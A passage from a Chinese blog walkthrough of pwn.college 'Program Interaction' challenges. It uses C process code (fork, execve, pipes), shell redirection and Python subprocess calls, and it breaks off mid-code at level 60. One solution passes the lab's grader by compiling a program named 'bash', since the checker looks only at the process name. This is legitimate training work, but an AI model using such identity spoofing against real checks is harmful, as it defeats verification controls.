

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/first.png">
  <link rel="icon" href="/img/first.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Nuthecz">
  <meta name="keywords" content="">
  
    <meta name="description" content="Dojo的一些小技巧   推荐使用vscode连接，这样方便更改脚本的代码，不然使用ssh连接改代码真的慢还头疼。但是注意vscode它会自作主张，给运行程序加一些参数，具体看 Program Interaction的level 1   远程连接 ssh -i key hacker@dojo.pwn.college   所以推荐首先vscode搞起，运行不成功再ssh连接试一试    Progr">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwn.college(1)">
<meta property="og:url" content="http://example.com/posts/9b840b21.html">
<meta property="og:site_name" content="Nuthecz&#96;Blog">
<meta property="og:description" content="Dojo的一些小技巧   推荐使用vscode连接，这样方便更改脚本的代码，不然使用ssh连接改代码真的慢还头疼。但是注意vscode它会自作主张，给运行程序加一些参数，具体看 Program Interaction的level 1   远程连接 ssh -i key hacker@dojo.pwn.college   所以推荐首先vscode搞起，运行不成功再ssh连接试一试    Progr">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402010000797.jpg">
<meta property="article:published_time" content="2024-01-18T10:18:45.000Z">
<meta property="article:modified_time" content="2024-06-21T04:11:58.595Z">
<meta property="article:author" content="Nuthecz">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402010000797.jpg">
  
  
  
  <title>Pwn.college(1) - Nuthecz`Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/fluid-extension.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_ijqayz9ro8k.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.11.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>


<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Nuthecz</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402010000342.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Pwn.college(1)"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-01-18 18:18" pubdate>
          2024年1月18日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          38k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          313 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Pwn.college(1)</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="dojo的一些小技巧"><a class="markdownIt-Anchor" href="#dojo的一些小技巧"></a> Dojo的一些小技巧</h1>
<ul>
<li>
<p>推荐使用vscode连接，这样方便更改脚本的代码，不然使用ssh连接改代码真的慢还头疼。但是注意vscode它会自作主张，给运行程序加一些参数，具体看 Program Interaction的level 1</p>
</li>
<li>
<p>远程连接 <code>ssh -i key hacker@dojo.pwn.college</code></p>
</li>
<li>
<p>所以推荐首先vscode搞起，运行不成功再ssh连接试一试</p>
</li>
</ul>
<h1 id="program-interaction"><a class="markdownIt-Anchor" href="#program-interaction"></a> Program Interaction</h1>
<h2 id="level-1"><a class="markdownIt-Anchor" href="#level-1"></a> level 1</h2>
<blockquote>
<p>要求使用bash启动程序，但是vscode的terminal会自动添加一些程序执行参数，这些可能影响检测</p>
</blockquote>
<h3 id="wp1"><a class="markdownIt-Anchor" href="#wp1"></a> wp1</h3>
<p>​	在使用ssh或者桌面版bash的情况下，该命令执行即可。但是用vscode的terminal时，它会自动添加一些程序执行参数，导致检测失败，无法获得flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/challenge/embryoio_level1<br></code></pre></td></tr></table></figure>
<h3 id="wp2"><a class="markdownIt-Anchor" href="#wp2"></a> wp2</h3>
<p>​	这里使用 <code>execve</code> ，它并不会创建一个新的进程，而是替换当前进程的内容。因此，新程序的执行环境会取代原始进程的执行环境，包括进程ID(PID)。也就是说，如果在一个Shell中执行C程序，并且该C程序中包含了 <code>execve</code> 调用，那么新程序会在Shell的进程上下文中运行，而不会创建一个新的进程</p>
<p>​	所以这里编译后(编译后的文件名随意)在ssh和桌面版执行就是使用bash执行了，但是问题是用vscode的terminal时还会出现参数问题，怀疑还是vscode执行时瞎添加</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwncollege</span><span class="hljs-params">(<span class="hljs-type">char</span>* argv[],<span class="hljs-type">char</span> *env[])</span>&#123;<br>    <span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/challenge/embryoio_level1&quot;</span>, args, env);<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[], <span class="hljs-type">char</span>* env[])</span>&#123;<br>    pwncollege(argv,env);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<h3 id="wp3"><a class="markdownIt-Anchor" href="#wp3"></a> wp3</h3>
<p>​	这里增加一层父子进程，使用子进程来执行 <code>execve</code> ，但是这里子进程的父进程不是 <code>bash</code> ，不能通过检测。观察 <code>checker.py</code> 中检测 bash 的代码，发现它只检测名称。所以可以先将c文件编译成名字为 <code>bash</code> 的文件，然后这样就可以通过检测了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_bash</span>(<span class="hljs-params">process</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[TEST] Checking to make sure the process is the bash shell. If this is a check for the parent process, then,&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[TEST] most likely, this is what you do by default anyways, but we&#x27;ll check just in case...&quot;</span>)<br>    check_exe_basename(process, <span class="hljs-string">&#x27;bash&#x27;</span>)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(process.cmdline()) == <span class="hljs-number">1</span>, <span class="hljs-string">f&quot;The shell process must be running in its default, interactive mode (/bin/bash with no commandline arguments). Your commandline arguments are: <span class="hljs-subst">&#123;process.cmdline()&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure>
<p>​	c代码，通过 <code>gcc tmp.c -o bash</code> 来编译，之后使用 <code>./bash</code> ，然后这样在ssh，桌面版，还是vscode的terminal中，都可以运行成功，拿到flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwncollege</span><span class="hljs-params">(<span class="hljs-type">char</span>* argv[],<span class="hljs-type">char</span> *env[])</span>&#123;<br>    <span class="hljs-type">char</span> *args[]=&#123;<span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/challenge/embryoio_level1&quot;</span>, args, env);<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span>* argv[],<span class="hljs-type">char</span>* env[])</span>&#123;<br>    <span class="hljs-type">pid_t</span> pid;<br>    pid=fork();<br>    <span class="hljs-keyword">if</span> (pid==<span class="hljs-number">0</span>)&#123;<br>        pwncollege(argv,env);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        wait(<span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="level-4"><a class="markdownIt-Anchor" href="#level-4"></a> level 4</h2>
<blockquote>
<p>环境变量的设置</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> yqxjyb=isdvinxiir<br>./challenge/embryoio_level4<br></code></pre></td></tr></table></figure>
<h2 id="level-5"><a class="markdownIt-Anchor" href="#level-5"></a> level 5</h2>
<blockquote>
<p>一开始没搞懂，后来知道是重定向到文件的stdin，而不是0</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> yorlicln &gt; /tmp/tlvzpz<br>./challenge/embryoio_level5 &lt; /tmp/tlvzpz<br></code></pre></td></tr></table></figure>
<h2 id="level-7"><a class="markdownIt-Anchor" href="#level-7"></a> level 7</h2>
<blockquote>
<p>主要是不知道环境变量的设置问题</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 提示</span><br>- the challenge checks <span class="hljs-keyword">for</span> a specific parent process : bash<br>- the challenge will check that the environment is empty (except LC_CTYPE, <span class="hljs-built_in">which</span> is impossible to get rid of <span class="hljs-keyword">in</span> some cases)<br><span class="hljs-comment"># 这就是要求运行时环境变量为空，而env -i 中env用于运行命令时设置环境变量的命令，-i表示在执行命令时忽略当前环境中的所有环境变量</span><br><br><span class="hljs-comment"># 做法</span><br><span class="hljs-built_in">env</span> -i /challenge/embryoio_level7<br></code></pre></td></tr></table></figure>
<h2 id="level-11"><a class="markdownIt-Anchor" href="#level-11"></a> level 11</h2>
<blockquote>
<p>使用bash运行tmp.sh程序</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> ugdygr=ybezdhyzoq<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/challenge/embryoio_level11 ugdygr&#x27;</span> &gt; tmp.sh<br>bash tmp.sh<br></code></pre></td></tr></table></figure>
<h2 id="level-15"><a class="markdownIt-Anchor" href="#level-15"></a> level 15</h2>
<blockquote>
<p>使用ipython来执行特定的语句</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipython<br>import subprocess<br>subprocess.Popen(<span class="hljs-string">&quot;/challenge/embryoio_level15&quot;</span>)<span class="hljs-comment"># 这里使用run也是打开程序，有时候Popen会被认为docker-init</span><br></code></pre></td></tr></table></figure>
<h2 id="level-19-21"><a class="markdownIt-Anchor" href="#level-19-21"></a> level 19-21</h2>
<blockquote>
<p>这里就是专注于subprocess库的使用</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">echo</span> agpgvmpu &gt; /tmp/vngscc<br>ipython<br>import subprocess<br><span class="hljs-comment"># 标准输入</span><br>subprocess.run(<span class="hljs-string">&quot;/challenge/embryoio_level19&quot;</span>, stdin=open(<span class="hljs-string">&quot;/tmp/vngscc&quot;</span>))<br><span class="hljs-comment"># 标准输出</span><br>subprocess.run(<span class="hljs-string">&quot;/tmp/ultuey&quot;</span>, shell=True)  <span class="hljs-comment">#执行shell命令需设置为True</span><br>subprocess.run(<span class="hljs-string">&quot;/challenge/embryoio_level20&quot;</span>, stdout=open(<span class="hljs-string">&quot;/tmp/ultuey&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>))  <span class="hljs-comment">#注意open的参数为w是写入，否则什么信息都没有</span><br><span class="hljs-comment"># 环境变量为空</span><br>subprocess.run(<span class="hljs-string">&quot;/challenge/embryoio_level21&quot;</span>,<span class="hljs-built_in">env</span>=&#123;&#125;)  <span class="hljs-comment">#这里&#123;&#125;也可以用dict()</span><br></code></pre></td></tr></table></figure>
<h2 id="level-32"><a class="markdownIt-Anchor" href="#level-32"></a> level 32</h2>
<blockquote>
<p>这里就是使用c编译生成二进制文件，用fork()子进程来执行程序</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># vim中替换数字</span><br>:%s/31/32/g<br></code></pre></td></tr></table></figure>
<p>类似如下格式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwncollege</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span>&#123;<br>        <span class="hljs-type">pid_t</span> pid = fork();<br>        <span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<br>        	execl(<span class="hljs-string">&quot;/challenge/embryoio_level29&quot;</span>,<span class="hljs-string">&quot;embryoio_level29&quot;</span>,<span class="hljs-literal">NULL</span>)<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            waitpid(pid,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="level-41"><a class="markdownIt-Anchor" href="#level-41"></a> level 41</h2>
<blockquote>
<p>对于rev的使用，看了半天discord中两个人在level40下的对话，了解到ctrl+d被用作终端的文件结束符，能结束rev的数据接收</p>
</blockquote>
<ul>
<li>ctrl+c
<ul>
<li>通常用于中断当前正在运行的进程，发送一个中断信号给当前正在前台运行的进程，导致该进程终止。这是强制性的中断信号</li>
</ul>
</li>
<li>ctrl+d
<ul>
<li>通常用于表示输入的结束，即文件结束符。按下ctrl+d，终端将认为您已经完成输入，也可以用于退出交互式shell</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcz@LAPTOP-46SOH5O1:/mnt/c/Users/NU/Desktop$ <span class="hljs-built_in">cat</span>  <span class="hljs-comment"># ctrl+c</span><br>jdklasjd<br>jdklasjd<br>^C<br>tcz@LAPTOP-46SOH5O1:/mnt/c/Users/NU/Desktop$ <span class="hljs-built_in">cat</span>  <span class="hljs-comment"># ctrl+d</span><br>djaklsjdlak<br>djaklsjdlak<br>jdkaljdalk<br>jdkaljdalk<br></code></pre></td></tr></table></figure>
<ul>
<li>wp</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">rev | /challenge/embryoio_level41<br><span class="hljs-comment"># 之后逆序输入随机数，然后使用ctrl+d结束rev的输入，然后rev的输出作为输入到可执行文件中</span><br></code></pre></td></tr></table></figure>
<h2 id="level-44"><a class="markdownIt-Anchor" href="#level-44"></a> level 44</h2>
<blockquote>
<p>sed b --&gt;  b label  Branch to label; if label is omitted, branch to end of script.</p>
<p>这里就是直接省略标签，然后跳转到末尾，这样就全部显示出标准输出了</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash tmp.sh<br><br><span class="hljs-comment"># tmp.sh</span><br>/challenge/embryoio_level44 | sed b<br></code></pre></td></tr></table></figure>
<h2 id="level-48"><a class="markdownIt-Anchor" href="#level-48"></a> level 48</h2>
<blockquote>
<p>使用ipython来实现管道[Popen的使用](<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34355232/article/details/87709418">python中的subprocess.Popen()使用_with subprocess.popen-CSDN博客</a>)</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><br>p1 = subprocess.Popen([<span class="hljs-string">&quot;/challenge/embryoio_level48&quot;</span>], stdout=subprocess.PIPE, shell=<span class="hljs-literal">False</span>)<br><span class="hljs-comment"># subprocess.PIPE为管道</span><br>p2 = subprocess.Popen([<span class="hljs-string">&quot;cat&quot;</span>], stdin=p1.stdout, stdout=subprocess.PIPE, shell=<span class="hljs-literal">False</span>)<br><span class="hljs-comment"># shell为False时，Popen使用os.execvp()来执行子程序，这时执行的命令不会在Shell中执行，满足题目要求。但是参数args[]，必须是字符串形式传递，比如[&quot;cat&quot;,&quot;flag.txt&quot;]可以使用，但是[&quot;cat flag.txt&quot;]不可以使用，它需要shell=True</span><br><span class="hljs-built_in">print</span>(p2.communicate()[<span class="hljs-number">0</span>])，<br><span class="hljs-comment"># 这里返回元组(stdout_data, stderr_data)，这里就是获取p2的标准输出</span><br><br><span class="hljs-comment"># ipython中运行 %run *.py</span><br></code></pre></td></tr></table></figure>
<h2 id="level-59"><a class="markdownIt-Anchor" href="#level-59"></a> level 59</h2>
<blockquote>
<p>主要就是对于rev的处理</p>
</blockquote>
<h2 id="level-60"><a class="markdownIt-Anchor" href="#level-60"></a> level 60</h2>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://book.itheima.net/course/223/1277519158031949826/1277528240394608641">匿名管道</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"># 提示 - the challenge checks <span class="hljs-keyword">for</span> a specific process at the other end of <span class="hljs-built_in">stdout</span> : cat<br># 这里就是需要将 embryoio_level60 的输出传递到 cat 中<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwncollege</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> fd[<span class="hljs-number">2</span>];<br>    pipe(fd);<span class="hljs-comment">//注意管道的建立必须在父子进程建立之前，否则它们不会共用管道</span><br>    <span class="hljs-type">int</span> pid = fork();<br>    <br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<span class="hljs-comment">//子进程</span><br>    &#123;<br>        close(fd[<span class="hljs-number">0</span>]);<span class="hljs-comment">//关闭管道的读，使管道只能被写入，便于下面写入管道</span><br>        dup2(fd[<span class="hljs-number">1</span>], STDOUT_FILENO);<span class="hljs-comment">//dup2将标准输出(STDOUT_FILENO)重定向到管道的写入端 fd[1]。这样下面的输出将不再是默认终端输出，而是写入管道中</span><br>        execl(<span class="hljs-string">&quot;/challenge/embryoio_level60&quot;</span>, <span class="hljs-string">&quot;embryoio_level60&quot;</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><span class="hljs-comment">//父进程</span><br>    &#123;<br>        <span class="hljs-type">int</span> fpid = fork();<br>        <span 